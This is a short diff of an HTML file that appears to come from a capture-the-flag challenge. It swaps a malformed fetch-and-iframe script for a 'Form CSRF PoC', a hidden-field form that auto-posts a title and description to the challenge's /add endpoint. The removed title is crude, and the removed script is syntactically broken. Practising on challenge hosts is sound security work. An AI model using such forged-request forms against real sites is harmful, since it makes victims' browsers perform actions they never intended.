@@ -1,16 +1,11 @@
-<iframe id="id_description_iframe" src="https://0a4d15a8f3d66d7319d75c5db6473390.film-library.challs.snakectf.org/"></iframe>
-<script>
-  fetch("https://0a4d15a8f3d66d7319d75c5db6473390.film-library.challs.snakectf.org/",
-        method: "post",
-  headers: {
-    'Accept': 'application/json',
-    'Content-Type': 'application/json'
-  },
-
-  //make sure to serialize your JSON body
-  body: JSON.stringify({
-    title: 'gaysex',
-    description: document.getElementById('id_description_iframe')
-  })
-})
-</script>
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://634b195243f24ccdbc62e09f47f0eec9.film-library.challs.snakectf.org/add">
+			<input type="hidden" name="title" value="ihatedemo">
+			<input type="hidden" name="description" value="ocracy">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
